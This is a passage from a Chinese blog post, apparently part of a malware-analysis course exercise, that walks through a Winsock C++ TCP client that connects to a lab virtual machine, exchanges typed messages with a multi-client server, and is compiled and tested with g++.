<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">WSADATA wsaData;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">WSAStartup</span>(<span class="built_in">MAKEWORD</span>(<span class="number">2</span>, <span class="number">2</span>), &amp;wsaData) != <span class="number">0</span>) &#123;</span><br><span class="line">    std::cerr &lt;&lt; <span class="string">&quot;Failed to initialize Winsock.\n&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这部分代码用于初始化 Winsock 库，确保网络库正确启动。</p>
<p><strong>2. 创建套接字并连接到服务器：</strong></p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">SOCKET clientSocket = <span class="built_in">socket</span>(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">sockaddr_in serverAddress;</span><br><span class="line">serverAddress.sin_family = AF_INET;</span><br><span class="line">serverAddress.sin_port = <span class="built_in">htons</span>(<span class="number">4444</span>);</span><br><span class="line">serverAddress.sin_addr.s_addr = <span class="built_in">inet_addr</span>(<span class="string">&quot;192.168.65.136&quot;</span>);</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">connect</span>(clientSocket, (<span class="keyword">struct</span> sockaddr*)&amp;serverAddress, <span class="built_in">sizeof</span>(serverAddress)) == SOCKET_ERROR) &#123;</span><br><span class="line">    std::cerr &lt;&lt; <span class="string">&quot;Failed to connect to server.\n&quot;</span>;</span><br><span class="line">    <span class="built_in">closesocket</span>(clientSocket);</span><br><span class="line">    <span class="built_in">WSACleanup</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在这里，客户端创建了一个套接字并连接到指定的服务器地址和端口。</p>
<p><strong>3. 发送和接收数据：</strong></p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">    <span class="comment">// 从命令行输入获取消息</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="comment">// 发送消息给服务器</span></span><br><span class="line">    <span class="built_in">sendDataToServer</span>(clientSocket, message);</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="comment">// 接收服务器的响应</span></span><br><span class="line">    <span class="built_in">receiveDataFromServer</span>(clientSocket);</span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="literal">true</span>);</span><br></pre></td></tr></table></figure>

<p>客户端通过 <code>sendDataToServer</code> 函数将用户输入的消息发送给服务器，并通过 <code>receiveDataFromServer</code> 函数接收服务器的响应。</p>
<p><strong>4. 关闭套接字和清理 Winsock：</strong></p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">closesocket</span>(clientSocket);</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br></pre></td></tr></table></figure>

<p>在程序结束时，客户端关闭套接字并清理 Winsock 资源。</p>
<p><strong>5. 注意事项：</strong></p>
<ul>
<li>与服务器端一样，客户端也使用了 Winsock 初始化和清理。</li>
<li>IP 地址硬编码为 “192.168.65.136”，在实际应用中可能需要根据实际情况进行更灵活的配置。</li>
<li>输入 ‘exit’ 会退出循环，关闭套接字，并清理 Winsock</li>
</ul>
<h5 id="测试-1"><a href="#测试-1" class="headerlink" title="测试"></a>测试</h5><ol>
<li><strong>输入以下指令编译cpp。</strong></li>
</ol>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">g++ task3_server.cpp -o task3_server.exe -lws2_32</span><br><span class="line">g++ task3_client.cpp -o task3_client.exe -lws2_32</span><br></pre></td></tr></table></figure>

<p><code>-lws2_32</code> 选项的作用是在链接阶段将 Winsock 库与你的程序关联，使得你可以在程序中使用 Winsock 提供的网络函数。如果你在程序中使用了 Winsock 函数，但没有添加这个选项，编译器会报错，因为它找不到相应的函数实现。</p>
<ol start="2">
<li><strong>在虚拟机(ip&#x3D;192.168.65.136)上运行server程序，在物理机上运行client程序。</strong></li>
</ol>
<p>在虚拟机上运行task3_server.exe:</p>
<p><a href="/../img/Malware-Analysis-Practice2/6.png" title="6" class="gallery-item" style="box-shadow: none;"> <img src="/../img/Malware-Analysis-Practice2/6.png" alt="6"></a></p>
<p>在物理机上运行task3_client.exe:</p>
<p><a href="/../img/Malware-Analysis-Practice2/7.png" title="7" class="gallery-item" style="box-shadow: none;"> <img src="/../img/Malware-Analysis-Practice2/7.png" alt="7"></a></p>
<p>可以看见client端连接上server端时，server端会打印目前连接的client数量以及ip和port信息。</p>
<ol start="3">
<li><strong>尝试多个client端连接server端</strong></li>
</ol>
<p>在物理机上运行3个task3_client.exe程序，模拟三个client连接至server。</p>
<p><a href="/../img/Malware-Analysis-Practice2/8.png" title="8" class="gallery-item" style="box-shadow: none;"> <img src="/../img/Malware-Analysis-Practice2/8.png" alt="8"></a></p>
<p>可以在server端看见三个client的ip和port信息。</p>
<ol start="4">
<li><strong>client端向server端发送数据</strong></li>
</ol>
<p><a href="/../img/Malware-Analysis-Practice2/9.png" title="9" class="gallery-item" style="box-shadow: none;"> <img src="/../img/Malware-Analysis-Practice2/9.png" alt="9"></a></p>
<p>可以看见在server端可以正常收到多个client的消息，并且能够正确处理。</p>
</div><script src="/js/lightgallery.min.js"></script><script>
        if("undefined"!=typeof lightGallery) {
        var options1 = {
            selector: '.gallery-item'
        };
        lightGallery(document.getElementsByClassName('article-gallery')[0], options1);
        }
        </script>
    </div>

    <div class="post-meta">
        <i>
        
            <span>2023-11-26</span>
            
                <span>该篇文章被 jay1an</span>
            
            
                <span>打上标签:
                    
                    
                        <a href='/tags/c/'>
                            c
                        </a>
                    
                        <a href='/tags/%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B/'>
                            系统编程
                        </a>
                    
                        <a href='/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/'>
                            恶意代码分析
                        </a>
                    
                </span>
             
             
                <span>归为分类:
                    
                    
                        <a href='/categories/%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8/'>
                            网络空间安全
                        </a>
                    
                </span>
            
        
        </i>
    </div>
    <br>
    
    <!-- <div class="post-footer-pre-next">
        <span>上一篇：<a href=""></a></span>
        <span class="post-footer-pre-next-last-span-right">上一篇：<a href=""></a></span>
    </div> -->

    
        

     
</div>



                                      
                    
                    
                    <div class="footer">
    
        <span> 
            © 1949-2024 China 

            
                

            
        </span>
    
</div>
<!--这是指一条线往下的内容-->
<div class="footer-last">
    
            <span>从头努力也坎坷</span>
            
    
</div>


    
<script src="/js/jquery/3.4.0/jquery.min.js"></script>

    <!--目录-->
    
        <script src="/js/jquery/1.7.2/jquery.min.js" type="text/javascript"></script>
        <script src="/js/jqueryui/1.12.1/jquery-ui.min.js" type="text/javascript"></script>
        <script src="/js/jquery.tocify/1.9.0/javascripts/jquery.tocify.min.js" type="text/javascript"></script>
        
<script src="/js/toc.js"></script>

    
    

    
<script src="/js/randomHeaderContent.js"></script>

    <!--回到顶部按钮-->
    
        
<script src="/js/returnToTop.js"></script>

    

    
        
<script src="/js/returnToLastPage.js"></script>

    





<script src="/js/lightgallery.min.js"></script>



                </div>
            
            
                <!-- 回到顶部的按钮-->  
                <div class="progress-wrap shadow-drop-2-bottom">
                    <svg class="progress-circle svg-content" width="100%" height="100%" viewBox="-1 -1 102 102">
                        <path d="M50,1 a49,49 0 0,1 0,98 a49,49 0 0,1 0,-98"/>
                    </svg>
                </div>
            
            
                <!-- 返回的按钮-->  
                <div class="return-to-last-progress-wrap shadow-drop-2-bottom">
                    <svg class="progress-circle svg-content" width="100%" height="100%" viewBox="-1 -1 102 102">
                        <path d="M50,1 a49,49 0 0,1 0,98 a49,49 0 0,1 0,-98"/>
                    </svg>
                </div>
            
    </body>
</html>